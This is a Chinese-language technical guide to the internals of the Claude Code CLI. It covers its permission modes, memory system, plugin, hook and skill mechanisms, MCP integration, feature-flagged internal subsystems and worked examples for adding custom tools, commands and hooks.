### 8.2 权限模式状态机

```
┌─────────────────────────────────────────────────────────────┐
│                    权限模式状态机                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│    ┌─────────┐                                              │
│    │  auto   │───────► 自动批准所有工具调用                  │
│    └─────────┘                                              │
│         ▲                                                   │
│         │                                                   │
│    ┌─────────┐                                              │
│    │  ask    │───────► 交互式确认对话框（默认）              │
│    └─────────┘                                              │
│         ▲                                                   │
│         │                                                   │
│    ┌─────────┐                                              │
│    │  deny   │───────► 阻止所有调用                         │
│    └─────────┘                                              │
│                                                             │
│  切换方式：/permissions auto/ask/deny                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 8.3 认证与信任

**目录信任状态检查：**
```typescript
// 防止仓库劫持（KAIROS 激活前验证）
async function verifyDirectoryTrust() {
  const isTrusted = await checkGitRemote();
  if (!isTrusted) {
    throw new Error('Untrusted repository');
  }
}
```

**OAuth Scope 验证：**
```typescript
// Bridge 需要 user:profile 权限
async function verifyOAuthScope() {
  const scopes = await getOAuthScopes();
  if (!scopes.includes('user:profile')) {
    throw new Error('Missing required scope');
  }
}
```

**组织 UUID 校验：**
```typescript
// 团队功能需验证组织身份
async function verifyOrganization() {
  const orgId = await getOrganizationId();
  if (!isValidOrg(orgId)) {
    throw new Error('Invalid organization');
  }
}
```

### 8.4 网络安全

**mTLS（双向 TLS）：**
```typescript
// src/utils/mtls.ts
async function createMTLSConnection() {
  const cert = await loadClientCert();
  const key = await loadClientKey();
  
  return https.request({
    cert: cert,
    key: key,
    ca: await loadServerCA()
  });
}
```

**SSRF 防护：**
```typescript
// src/utils/hooks/ssrfGuard.ts
function isSafeURL(url: string): boolean {
  // 检查是否是内网地址
  if (isInternalIP(url)) {
    return false;
  }
  // 检查协议
  if (!['http:', 'https:'].includes(new URL(url).protocol)) {
    return false;
  }
  return true;
}
```

---

## 第 9 章：记忆系统

### 9.1 记忆类型

Claude Code 实现了多层记忆系统：

| 类型 | 存储位置 | 用途 | 持久化 |
|------|---------|------|--------|
| 会话内存 | 内存 | 当前对话上下文 | 否 |
| 跨会话记忆 | ~/.cache/claude/sessions/ | 历史对话恢复 | 是 |
| 团队共享记忆 | ~/.claude/memory/ | 团队知识共享 | 是 |
| 项目记忆 | .claude/CLAUDE.md | 项目特定知识 | 是 |

### 9.2 记忆目录管理

**文件位置：** `src/memdir/`

**核心功能：**
- 路径解析
- 相关记忆查找
- 记忆扫描
- 记忆老化

**实现要点：**
```typescript
// 记忆文件发现
async function discoverMemoryFiles() {
  const files = await glob('**/*.md', {
    cwd: memoryDir
  });
  return files;
}

// 相关记忆查找
async function findRelevantMemories(query: string) {
  // 1. 语义搜索
  const candidates = await semanticSearch(query);
  
  // 2. 去重
  const deduped = deduplicate(candidates);
  
  // 3. 过滤
  const filtered = filterByRelevance(deduped);
  
  return filtered;
}

// 记忆老化
async function ageMemories() {
  const memories = await loadAllMemories();
  for (const memory of memories) {
    if (isExpired(memory)) {
      await archiveMemory(memory);
    }
  }
}
```

### 9.3 会话存储与持久化

**文件结构：**

| 文件/目录 | 用途 | 格式 |
|----------|------|------|
| transcript.jsonl | 对话记录（追加写，不修改历史） | JSONL，每行一条消息 |
| file_history/ | 每次 Turn 开始时的文件状态快照 | SHA 哈希索引 |
| config.json | 全局设置（模型、权限规则、MCP 等） | JSON |

**会话恢复流程：**
```typescript
async function restoreSession(sessionId: string) {
  // 1. 加载 transcript
  const transcript = await loadTranscript(sessionId);
  
  // 2. 恢复文件历史
  const fileHistory = await loadFileHistory(sessionId);
  
  // 3. 重建状态
  const state = rebuildState(transcript, fileHistory);
  
  return state;
}
```

---

## 第 10 章：插件与 Skill 系统

### 10.1 插件系统

**文件位置：** `src/services/plugins/`、`src/plugins/`

**插件类型：**

| 类型 | 说明 |
|------|------|
| 内置插件 | registerBuiltinPlugin() 注册，Anthropic 维护（claudeApi, debug, verify, stuck 等） |
| 市场插件 | plugin@marketplace 格式，发现与安装 |
| 会话插件 | 通过 CLI 参数 / SDK 选项注入 |
| 内联插件 | --plugin-dir 指定目录 |

**插件目录结构：**
```
my-plugin/
├── plugin.json          # 可选的清单文件
├── commands/            # 斜杠命令
│   └── build.md         # /build 命令
├── agents/              # AI Agent
│   └── code-reviewer.md # Agent 系统提示定义
├── hooks/               # Hook 配置
│   └── hooks.json       # PreToolUse/PostToolUse/SessionStart
├── output-styles/       # 自定义输出样式
│   └── compact.md
└── skills/              # 可复用 Skill 定义
    └── refactor.md
```

### 10.2 Hook 系统

**Hook 事件类型：**

| Hook 类型 | 触发时机 | 可用环境变量 |
|----------|---------|-------------|
| PreToolUse | Tool 执行前（权限检查后） | $CLAUDE_TOOL_NAME, $CLAUDE_TOOL_INPUT_* |
| PostToolUse | Tool 执行完成后 | 同上 + $CLAUDE_TOOL_OUTPUT |
| PreCompact | 上下文压缩前 | $CLAUDE_SESSION_ID |
| PostCompact | 上下文压缩后 | 同上 |
| SessionStart | 会话启动时 | $CLAUDE_SESSION_ID, $CLAUDE_CWD |
| SessionStop | 会话结束时 | 同上 |

**Hook 配置示例：**
```json
{
  "PostToolUse": [
    {
      "matcher": "Write",
      "hooks": [{
        "type": "command",
        "command": "prettier --write \"$CLAUDE_TOOL_INPUT_FILE_PATH\" 2>/dev/null || true"
      }]
    },
    {
      "matcher": "Edit",
      "hooks": [{
        "type": "command",
        "command": "eslint --fix \"$CLAUDE_TOOL_INPUT_PATH\" 2>/dev/null || true"
      }]
    }
  ],
  "SessionStart": [{
    "hooks": [{ "type": "command", "command": "git status --short" }]
  }]
}
```

### 10.3 Skill 系统

**文件位置：** `src/skills/`

**Skill 类型：**
- 内置技能：registerBundledSkill() 启动时注册
- 磁盘技能：`.claude/skills/*.md` 目录下的 Markdown 文件

**Skill 定义示例：**
```markdown
---
name: refactor
description: Code refactoring skill
allowedTools:
  - Read
  - Edit
  - Bash
---

You are a code refactoring expert. Follow these steps:

1. Analyze the code structure
2. Identify code smells
3. Suggest improvements
4. Apply refactoring

Always maintain backward compatibility.
```

**Skill 提取：**
```typescript
// 注入基础目录用于文件访问
async function loadSkills() {
  const skills = await glob('**/*.md', {
    cwd: skillsDir
  });
  
  for (const skill of skills) {
    const content = await fs.readFile(skill);
    const parsed = parseSkill(content);
    registerSkill(parsed);
  }
}
```

---

## 第 11 章：MCP 集成

### 11.1 传输类型对比

| 类型 | 适用场景 | 配置字段 | 推荐 |
|------|---------|---------|------|
| stdio | 本地子进程，最常用，零网络延迟 | command + args + env | ✅ 推荐 |
| sse | 远程 HTTP SSE 流，支持服务端推送 | url + headers | 远程服务 |
| http | 远程 HTTP 请求 - 响应 | url + headers | 简单 REST |
| ws | WebSocket 双向通信 | url | 低延迟场景 |
| sdk | SDK 内嵌模式（程序化注入） | 代码注入 | SDK 使用 |

### 11.2 MCP 工具集成流程

```
1. 配置 MCP 服务器
    │
    ▼
2. 建立连接（stdio/sse/ws/http）
    │
    ▼
3. 发现工具和资源
    │
    ▼
4. 注册到工具系统
    │
    ▼
5. 工具调用
    │
    ▼
6. 结果返回
```

### 11.3 配置示例

```json
{
  "mcpServers": {
    "filesystem": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/dir"]
    },
    "github": {
      "type": "sse",
      "url": "https://api.githubcopilot.com/mcp/",
      "headers": {
        "Authorization": "Bearer ${GITHUB_TOKEN}"
      }
    },
    "my-server": {
      "type": "stdio",
      "command": "node",
      "args": ["/path/to/my-mcp-server.js"],
      "env": { "API_KEY": "${MY_API_KEY}" }
    }
  }
}
```

---

# 第五部分：高级功能

## 第 12 章：七大隐藏子系统

### 12.1 BUDDY — AI 电子宠物

**源码位置：** `src/buddy/`
**编译开关：** `feature('BUDDY')`

终端里的拓麻歌子——一个完整的虚拟宠物系统。

**特性：**
- **18 种物种**：鸭子、鹅、猫、龙、章鱼、猫头鹰、企鹅、乌龟、蜗牛、幽灵、六角恐龙、水豚、仙人掌、机器人、兔子、蘑菇、果冻、胖猫
- **5 级稀有度**：普通 (60%) → 非凡 (25%) → 稀有 (10%) → 史诗 (4%) → 传说 (1%)
- **1% 闪光概率**：独立于稀有度的闪光个体
- **确定性生成**：账号 UUID + 盐值 'friend-2026-401' → FNV-1a 哈希 → Mulberry32 PRNG → 每人固定一只
- **外观**：7 种眼睛样式 + 8 种帽子（皇冠、巫师帽、光环等）

**命令：**
```bash
/buddy pet     # 抚摸 + 爱心动画
/buddy hatch   # 孵化
/buddy card    # 查看卡片
```

**动画：** 8 帧 ASCII 精灵，200ms 帧率，窄终端自动退化为表情文字脸 `=・ω・=`

### 12.2 KAIROS — 持久助手模式

**源码位置：** `src/assistant/`、`src/proactive/`、`src/services/autoDream/`
**编译开关：** `feature('KAIROS')`、`feature('KAIROS_BRIEF')`、`feature('KAIROS_CHANNELS')`

关掉终端 Claude 还在运行的持久助手。

**激活条件：**
```json
// .claude/settings.json
{
  "assistant": true  // 激活持久助手
}
```

**5 层激活链：**
```
编译标志 → settings.assistant → 信任检查 → GrowthBook → 全局状态
```

**核心功能：**
- **跨会话持久**：.claude/settings.json 中 assistant: true 激活
- **每日日志**：自动写入 `<autoMemPath>/logs/YYYY/MM/YYYY-MM-DD.md`
- **自动做梦（Dream）**：
  - 触发条件：距上次超 24h + 5 条新会话 + 无并发锁
  - 4 阶段：Orient → Gather → Consolidate → Prune
  - 锁文件 `.consolidate-lock` + PID 存活检查
- **会话恢复**：通过 OAuth API `v1/sessions/{sessionId}/events` 恢复历史
- **后台任务**：命令超 15s 自动后台化，支持持久 cron（`permanent: true`）

### 12.3 ULTRAPLAN — 云端深度规划

**源码位置：** `src/commands/ultraplan.tsx`、`src/utils/ultraplan/`
**编译开关：** `feature('ULTRAPLAN')`

将复杂问题交给云端 Opus 独立研究，最长 30 分钟。

**流程：**
```
/ultraplan <prompt>
    │
    ▼
创建远程 CCR 会话
    │
    ▼
Opus 独立研究（最长 30 分钟）
    │
    ▼
浏览器查看/修改
    │
    ▼
批准执行
```

**传送机制：** `src/utils/teleport.tsx` 实现 local → remote 会话传输，通过 Git Bundle 打包上下文

**关键词触发：** 消息包含 "ultraplan" 自动唤起（排除引号/路径中的误触发）

**完全内部限定：** `isEnabled: () => "external" === 'ant'`，外部版本永远不可用

### 12.4 Coordinator — 多 Agent 编排

**源码位置：** `src/coordinator/`
**编译开关：** `feature('COORDINATOR_MODE')`
**环境变量：** `CLAUDE_CODE_COORDINATOR_MODE`

主 Claude 变成纯指挥官，Worker 并行执行任务。

**角色分离：**
- **Coordinator** 只有 3 个工具：Agent（派活）、SendMessage（通信）、Shutdown（停工）
- **Worker** 拥有完整工具集（排除内部工具）

**核心纪律：** 系统提示要求禁止甩锅式委派——不能把不清楚的需求直接丢给 Worker

**4 阶段工作流：**
```
研究（并行）→ 综合 → 实现 → 验证
```

**任务共享：** 基于文件的共享任务列表 `~/.claude/tasks/`

**Scratchpad：** Agent 间通过临时文件通信

### 12.5 Bridge — 远程遥控终端

**源码位置：** `src/bridge/`（13 个文件）
**编译开关：** `feature('BRIDGE_MODE')`、`feature('DAEMON')`

从 claude.ai 或手机远程操控本地 CLI。

**双模式：**
- 独立守护进程 `claude remote-control`
- REPL 内嵌 `/remote-control`

**混合传输：** WebSocket 读取 + HTTP POST 写入

**3 种会话模式：**
- 单会话
- 隔离 worktree
- 共享目录

**权限审计：** 远程端通过 `bridgePermissionCallbacks.ts` 审批权限请求

**JWT 刷新：** 定时刷新认证 Token

**状态同步：** `bridgeStatusUtil.ts` 实时同步运行状态

**可信设备：** `trustedDevice.ts` 设备信任管理

### 12.6 Voice — 语音交互

**源码位置：** `src/voice/`
**编译开关：** `feature('VOICE_MODE')`

**功能：**
- STT（语音转文字）集成
- TTS（文字转语音）输出
- 关键词追踪与上下文补充

**GrowthBook 开关：** `tengu_cobalt_frost`

### 12.7 Proactive — 主动自主模式

**源码位置：** `src/proactive/`
**编译开关：** `feature('PROACTIVE')` / `feature('KAIROS')`

无人值守时 Claude 自己找活干。

**实现：**
- 空闲时调用 SleepTool 等待
- 接收周期性 `<tick>` 提示检查任务
- 与 KAIROS 深度集成

---

## 第 13 章：Feature Flags 与死代码消除

### 13.1 编译时开关

Anthropic 利用 Bun 的 `bun:bundle` 实现构建时 Feature Flag 注入。当 flag 为 `false` 时，整个代码分支在打包时被完全移除，外部发布版本不包含任何内部专属功能的代码或字符串。

**主要 Flag 列表：**

| Flag | 功能描述 | 外部版本 |
|------|---------|---------|
| KAIROS | 助手模式（always-on AI 助手） | ❌ 移除 |
| PROACTIVE | 主动模式 | ❌ 移除 |
| VOICE_MODE | 语音输入 | ❌ 移除 |
| BRIDGE_MODE | IDE 桥接 | ✅ 保留 |
| COORDINATOR_MODE | 多 Agent 协调器 | ❌ 移除 |
| AGENT_TRIGGERS | 定时/远程 Agent 触发器 | ❌ 移除 |
| AGENT_TRIGGERS_REMOTE | 远程触发 Agent | ❌ 移除 |
| MONITOR_TOOL | 监控工具 | ❌ 移除 |
| TRANSCRIPT_CLASSIFIER | 命令自动分类（Auto Mode 核心） | ✅ 保留 |
| HISTORY_SNIP | 历史记录截断 | ✅ 保留 |
| REACTIVE_COMPACT | 响应式上下文压缩 | ✅ 保留 |
| ENABLE_AGENT_SWARMS | Agent 团队功能 | ✅ 保留 |
| ANT_ONLY | 内部员工专属功能 | ❌ 移除 |
| CONTEXT_COLLAPSE | 上下文折叠压缩 | ✅ 保留 |
| DAEMON | 守护进程模式 | ❌ 移除 |
| ABLATION_BASELINE | 实验对照组 | ❌ 移除 |
| DUMP_SYSTEM_PROMPT | 导出系统提示（调试用） | ❌ 移除 |

### 13.2 使用方式

```typescript
// 条件编译
if (feature('KAIROS')) {
  // 只有启用 KAIROS 时才包含此代码
  initKAIROS();
}

// 外部版本中，这段代码被完全移除
```

---

# 第六部分：二次开发

## 第 14 章：扩展点指南

### 14.1 添加新 Tool（修改源码方式）

**完整示例：**

```typescript
// src/tools/MyCustomTool/MyCustomTool.ts
import { z } from 'zod/v4'
import type { Tool, ToolUseContext, ToolResult } from '../../Tool.js'

const InputSchema = z.object({
  target: z.string().describe('操作目标路径或标识符'),
  options: z.object({
    verbose: z.boolean().default(false).describe('是否输出详细信息'),
    dryRun: z.boolean().default(false).describe('是否只模拟执行'),
  }).optional(),
})

export const MyCustomTool: Tool<typeof InputSchema, string> = {
  name: 'MyCustom',
  searchHint: 'custom operation for specific domain task',
  inputSchema: InputSchema,
  maxResultSizeChars: 10_000,
  
  async call(args, context: ToolUseContext, canUseTool, parentMsg, onProgress) {
    const { target, options } = args
    
    // 进度报告
    onProgress?.({ 
      toolUseID: '...', 
      data: { type: 'progress', percent: 50 } 
    })
    
    // 执行逻辑
    const result = await doSomething(target, context.abortController.signal)
    
    return { data: result }
  },
  
  async description(input) { 
    return `执行：${input.target}` 
  },
  
  isEnabled()             { return true },
  isReadOnly()            { return false },
  isConcurrencySafe()     { return true },
  isDestructive()         { return false },
}
```

**注册工具：**
```typescript
// src/tools.ts
import { MyCustomTool } from './tools/MyCustomTool/MyCustomTool.js'

registerTool(MyCustomTool)
```

### 14.2 通过插件系统扩展（推荐，无需修改源码）

**命令插件示例（commands/analyze.md）：**

```markdown
---
description: Deep code analysis with metrics
allowedTools:
  - Bash
  - Read
  - Glob
  - Grep
---

You are a code analysis expert. Analyze the codebase for:

1. Code complexity metrics
2. Dependency structure
3. Test coverage gaps
4. Performance bottlenecks

Target: $ARGUMENTS

Provide actionable recommendations with file:line references.
```

**Hook 插件示例（hooks/hooks.json）：**

```json
{
  "PostToolUse": [
    {
      "matcher": "Write",
      "hooks": [{
        "type": "command",
        "command": "prettier --write \"$CLAUDE_TOOL_INPUT_FILE_PATH\" 2>/dev/null || true"
      }]
    },
    {
      "matcher": "Edit",
      "hooks": [{
        "type": "command",
        "command": "eslint --fix \"$CLAUDE_TOOL_INPUT_PATH\" 2>/dev/null || true"
      }]
    }
  ],
  "SessionStart": [{
    "hooks": [{ "type": "command", "command": "git status --short" }]
  }]
}
```

### 14.3 关键扩展点总览

| 扩展点 | 位置 | 扩展方式 |
|--------|------|---------|
| 工具 | src/tools/ | 实现 Tool 接口 |
| 命令 | src/commands/ | Markdown 定义 |
| Hook | hooks/hooks.json | JSON 配置 |
| Agent | .claude/agents/ | Markdown 定义 |
| Skill | .claude/skills/ | Markdown 定义 |
| MCP | config.json | JSON 配置 |
| 插件 | ~/.config/claude/plugins/ | 目录结构 |

### 14.4 重要配置文件路径

| 路径 | 用途 | 修改方式 |
|------|------|---------|
| `~/.config/claude/config.json` | 全局设置（模型、权限、MCP 等） | /config 命令或直接编辑 |
| `~/.config/claude/CLAUDE.md` | 用户级全局系统提示 | 直接编辑 |
| `.claude/CLAUDE.md`（项目根） | 项目级系统提示，自动注入 | 直接编辑 |
| `.claude/settings.json` | 项目级权限规则 | 直接编辑 |
| `~/.cache/claude/sessions/` | 会话持久化目录 | 只读（自动管理） |
| `~/.config/claude/plugins/` | 插件安装目录 | /plugin 命令或手动放置 |
| `~/.config/claude/skills/` | 用户级 Skill 定义目录 | 手动放置 .md 文件 |

---

## 第 15 章：实践项目

### 项目 1：添加自定义命令

**目标：** 创建一个 `/analyze` 命令，用于代码分析

**步骤：**

```bash
# 1. 创建命令文件
mkdir -p ~/.config/claude/plugins/my-plugin/commands
cat > ~/.config/claude/plugins/my-plugin/commands/analyze.md << 'EOF'
---
description: Deep code analysis with metrics
allowedTools:
  - Bash
  - Read
  - Glob
  - Grep
---

You are a code analysis expert. Analyze the codebase for:

1. Code complexity metrics
2. Dependency structure
3. Test coverage gaps
4. Performance bottlenecks

Target: $ARGUMENTS

Provide actionable recommendations with file:line references.
EOF

# 2. 安装插件
/plugin install ~/.config/claude/plugins/my-plugin

# 3. 测试
/analyze src/
```

### 项目 2：添加自定义工具

**目标：** 创建一个数据库查询工具

**步骤：**

```typescript
// 1. 创建工具文件
// src/tools/DatabaseQueryTool/DatabaseQueryTool.ts

import { z } from 'zod/v4'
import type { Tool, ToolUseContext, ToolResult } from '../../Tool.js'
import { queryDatabase } from './db-client.js'

const InputSchema = z.object({
  sql: z.string().describe('SQL query to execute'),
  params: z.array(z.string()).optional().describe('Query parameters'),
})

export const DatabaseQueryTool: Tool<typeof InputSchema, any[]> = {
  name: 'DatabaseQuery',
  searchHint: 'execute SQL queries against configured database',
  inputSchema: InputSchema,
  maxResultSizeChars: 50_000,
  
  async call(args, context) {
    const { sql, params } = args
    
    // 权限检查（写操作需要确认）
    if (isWriteQuery(sql) && !await canUseTool()) {
      return { error: 'Permission denied for write query' }
    }
    
    // 执行查询
    const result = await queryDatabase(sql, params)
    
    return { data: result }
  },
  
  async description(input) { 
    return `Database query: ${input.sql.substring(0, 50)}...` 
  },
  
  isReadOnly() {
    return !isWriteQuery(this.inputSchema.parse(this.args).sql)
  },
  
  isDestructive() {
    const sql = this.inputSchema.parse(this.args).sql
    return /DROP|DELETE|TRUNCATE/i.test(sql)
  },
}

// 2. 注册工具
// src/tools.ts
import { DatabaseQueryTool } from './tools/DatabaseQueryTool/DatabaseQueryTool.js'
registerTool(DatabaseQueryTool)

// 3. 测试
claude
> Query the database for all users created in the last 7 days
```

### 项目 3：实现 MCP 服务器

**目标：** 创建一个自定义 MCP 服务器

**步骤：**

```javascript
// 1. 创建 MCP 服务器
// my-mcp-server.js

import { Server } from '@modelcontextprotocol/sdk/server/index.js'
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js'

const server = new Server({
  name: 'my-custom-server',
  version: '1.0.0',
}, {
  capabilities: {
    tools: {},
  },
})

// 定义工具
server.tool('hello', 'Say hello', async (request) => {
  return {
    content: [{ type: 'text', text: 'Hello from MCP!' }],
  }
})

// 启动服务器
const transport = new StdioServerTransport()
await server.connect(transport)

// 2. 配置 Claude Code
// ~/.config/claude/config.json
{
  "mcpServers": {
    "my-server": {
      "type": "stdio",
      "command": "node",
      "args": ["/path/to/my-mcp-server.js"]
    }
  }
}

// 3. 测试
claude
> Use the hello tool from my-server
```

### 项目 4：添加自定义 Hook

**目标：** 在文件写入后自动格式化

**步骤：**

```json
// 1. 创建 Hook 配置
// ~/.config/claude/plugins/auto-format/hooks/hooks.json

{
  "PostToolUse": [
    {
      "matcher": "Write",
      "hooks": [{
        "type": "command",
        "command": "prettier --write \"$CLAUDE_TOOL_INPUT_FILE_PATH\" 2>/dev/null || true"
      }]
    },
    {
      "matcher": "Edit",
      "hooks": [{
        "type": "command",
        "command": "eslint --fix \"$CLAUDE_TOOL_INPUT_PATH\" 2>/dev/null || true"
      }]
    }
  ]
}

// 2. 测试
claude
> Create a new file test.ts with some code
// 文件会自动格式化
```

### 项目 5：实现子 Agent 协作

**目标：** 创建一个多 Agent 团队

**步骤：**

```bash
# 1. 定义 Agent
cat > .claude/agents/frontend.md << 'EOF'
---
name: Frontend Developer
description: Expert in React, TypeScript, and modern frontend development
skills:
  - React
  - TypeScript
  - CSS
  - Testing
---

You are a frontend development expert. Focus on:
- Clean, maintainable code
- Component reusability
- Performance optimization
- Accessibility

Always follow React best practices.
EOF

cat > .claude/agents/backend.md << 'EOF'
---
name: Backend Developer
description: Expert in Node.js, databases, and API design
skills:
  - Node.js
  - SQL
  - REST API
  - Security
---

You are a backend development expert. Focus on:
- Secure code
- Efficient database queries
- API design best practices
- Error handling
EOF

# 2. 创建团队
claude
> Create a team with a frontend developer and a backend developer to build a todo app

# 3. 观察协作
# Coordinator 会分配任务给两个 Agent
# 它们会通过 Scratchpad 通信
```

---

# 附录

## 附录 A：关键文件索引

| 文件 | 章节 | 重要性 |
|------|------|--------|
| src/main.tsx | 4.2 | ⭐⭐⭐ |
| src/QueryEngine.ts | 5 | ⭐⭐⭐ |
| src/Tool.ts | 6.1 | ⭐⭐⭐ |
| src/tools.ts | 6.1 | ⭐⭐⭐ |
| src/query.ts | 5.3 | ⭐⭐⭐ |
| src/context.ts | 5.4 | ⭐⭐ |
| src/state.ts | 3.3 | ⭐⭐ |
| src/services/api/claude.ts | 3.3 | ⭐⭐ |
| src/utils/permissions/bashClassifier.ts | 8.1 | ⭐⭐ |

## 附录 B：常见问题

**Q1: 如何找到某个功能的代码位置？**

A: 使用 grep 搜索：
```bash
# 搜索功能名称
grep -r "functionName" src/

# 搜索命令
grep -r "/commandName" src/

# 搜索工具
grep -r "ToolName" src/tools/
```

**Q2: 如何理解代码调用关系？**

A: 使用 VS Code 的调用层级：
1. 右键点击函数名
2. 选择"Peek Calls"
3. 查看调用者和被调用者

**Q3: 如何测试修改？**

A: 使用交互模式：
```bash
# 1. 启动开发模式
bun run dev

# 2. 执行测试命令
/commit
/review

# 3. 观察输出
```

**Q4: 如何理解 Feature Gate 的影响？**

A: 查看编译输出：
```bash
# 1. 构建项目
bun run build

# 2. 查看编译后的代码
# 搜索被裁剪的代码
```

## 附录 C：学习资源

- [TypeScript 官方文档](https://www.typescriptlang.org/docs/)
- [Bun 官方文档](https://bun.sh/docs)
- [Ink 官方文档](https://github.com/vadimdemedes/ink)
- [MCP 协议文档](https://modelcontextprotocol.io)
- [GitHub: ai-agent-deep-dive](https://github.com/tvytlx/ai-agent-deep-dive)

---

_版本：2.0 完整版_  
_最后更新：2026-04-09_  
_作者：小蛋蛋（技术专家视角）_  
_字数：约 50,000 字_

